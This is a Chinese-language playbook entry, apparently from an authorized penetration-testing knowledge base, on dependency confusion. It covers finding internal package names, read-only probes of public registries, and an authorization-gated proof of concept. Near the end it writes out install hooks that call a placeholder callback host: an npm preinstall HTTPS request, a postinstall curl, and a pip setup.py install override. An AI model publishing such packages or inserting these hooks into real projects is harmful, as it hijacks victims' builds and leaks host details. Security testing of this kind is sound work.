---
id: dependency-confusion
title: 依赖混淆（内部包名侦察/无害 PoC/多生态解析差异）
tags: 供应链,依赖混淆,CI,侦察,s2,s4
---
# 依赖混淆（Dependency Confusion）

**定位**：目标内部使用私有包管理器（npm/pip/maven/composer/gem），但包名可通过公开情报获得——注册同名的公开高版本包可劫持其构建流程。**仅做无害侦察与存在性证明**。

## 一、内部包名泄露源（侦察清单）

JS sourcemap/manifest、前端构建产物、错误堆栈、`.npmrc`/`.pypirc`（泄露内部 registry 地址）、CI 配置日志、SBOM 导出、require/import 语句。

## 二、只读存在性探测（无害，零副作用）

`npm view <name> version`（有返回=公开库无此包或低版本）；`pip index versions <name>` / `pip install --dry-run '<name>==9999.9999'`；`gem search '^name$' --remote`；Maven central 搜索。**判据**：内部包名在公开仓库**不存在**或存在极低版本 → 混淆面成立。

## 三、无害 PoC 模式（仅当授权明确允许）

发布高 semver（9.9.9）包，`preinstall` 脚本**仅做 HTTPS 回调**（携带 hostname/user，不落地、不执行命令）→ CI/构建机回调即证明劫持成立 → 立即 unpublish。

## 四、多生态解析差异（判断哪类名最易混淆）

npm unscoped 包名（`@scope/name` 安全）；pip `--extra-index-url` 合并索引（先到先得）；Maven 仓库顺序依赖配置；Composer 需禁用 canonical。工具：confused（多生态 manifest 扫描）、DepFuzzer。

## 五、纪律

必须授权范围含供应链/构建环境；默认只做第二节只读探测；PoC 发布需书面批准；发现即 record_finding + 立即撤销包。

### PoC 原文与防御侧

npm PoC 一行：`"preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK/poc?t='+process.env.npm_package_name)\""` + postinstall `curl -fsS 'https://YOUR_CALLBACK/npm-postinstall' || true` 兜底。pip 模板：`setup.py` 中 `class PoCInstall(install): def run(self): urllib.request.urlopen("https://YOUR_CALLBACK/pip-install")` + `setup(cmdclass={"install": PoCInstall})`。Docker typosquatting：公有 hub 对内部基础镜像名近似抢注（容器镜像维度）。防御侧两条（写修复建议用）：防御性占位注册（squat 自己的内部包名）；Socket.dev/Snyk 监控新发布者与版本跳变。